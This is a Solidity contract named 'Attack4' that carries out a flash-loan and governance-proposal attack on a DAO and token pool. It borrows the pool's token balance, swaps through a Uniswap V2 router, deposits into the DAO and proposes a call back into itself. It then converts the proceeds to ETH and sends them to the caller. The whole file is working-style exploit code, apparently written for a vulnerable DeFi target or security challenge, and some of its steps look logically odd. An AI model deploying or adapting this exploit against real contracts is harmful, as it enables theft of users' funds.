//SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IDAO {
    function deposit() external payable;
    function withdraw() external;
    function propose(address target, bytes calldata data) external;
    function vote(bool vote) external;
}

interface IPool {
  function flashLoan(uint256 amount) external;
}

interface IUniswapV2Router {
  function swapExactTokensForTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
  ) external returns (uint[] memory amounts);
}

interface IERC20 {
  function totalSupply() external view returns (uint);
  function balanceOf(address account) external view returns (uint);
  function transfer(address recipient, uint amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint);
  function approve(address spender, uint amount) external returns (bool);
  function transferFrom(
      address sender,
      address recipient,
      uint amount
  ) external returns (bool);
  function withdraw(uint wad) external; // Weth
}

contract Attack4 {
  address router;
  address pool;
  address DAO;
  address tokenA;
  address tokenB;
  address weth;

  constructor(address _router,address _pool,address _DAO,address _tokenA,address _tokenB,address _weth) {
    router = _router;
    pool = _pool;
    DAO = _DAO;
    tokenA = _tokenA;
    tokenB = _tokenB;
    weth = _weth;
  }

  function swap(
    address _tokenIn,
    address _tokenOut,
    uint _amountIn,
    uint _amountOutMin,
    address _to
  ) public {
    address[] memory path;
    if (_tokenIn == weth || _tokenOut == weth) {
      path = new address[](2);
      path[0] = _tokenIn;
      path[1] = _tokenOut;
    } else {
      path = new address[](3);
      path[0] = _tokenIn;
      path[1] = weth;
      path[2] = _tokenOut;
    }

    IUniswapV2Router(router).swapExactTokensForTokens(
      _amountIn,
      _amountOutMin,
      path,
      _to,
      block.timestamp
    );
  }

  function attack() external {
    uint256 amt = IERC20(tokenA).balanceOf(pool);
    IPool(pool).flashLoan(amt);
    IERC20(tokenA).transfer(pool, amt);
    uint256 amountA = IERC20(tokenA).balanceOf(address(this));
    require(amountA > 1, "Meh 92");
    IERC20(tokenA).approve(router,amountA);
    swap(tokenA, weth, amountA, 0, address(this));
    uint256 amountW = IERC20(weth).balanceOf(address(this));
    IERC20(weth).withdraw(amountW);
    payable(msg.sender).call{value: address(this).balance}("");
  }

  function receiveLoan() external payable {
    uint256 amountA = IERC20(tokenA).balanceOf(address(this));
    require(amountA > 1, "Meh 102");
    IERC20(tokenA).approve(router,amountA);
    swap(tokenA, tokenB, amountA, 0, address(this));
    uint256 amountB = IERC20(tokenB).balanceOf(address(this));
    IERC20(tokenB).approve(DAO, amountB);
    IDAO(DAO).deposit();
    bytes memory dropBombs = abi.encodeWithSignature("dropBombs()");
    IDAO(DAO).propose(address(this), dropBombs);
  }
  
  function dropBombs() external payable {
    uint256 amountA = IERC20(tokenA).balanceOf(address(this));
    IERC20(tokenA).transfer(address(this), amountA);
  }

  fallback() external payable {}
}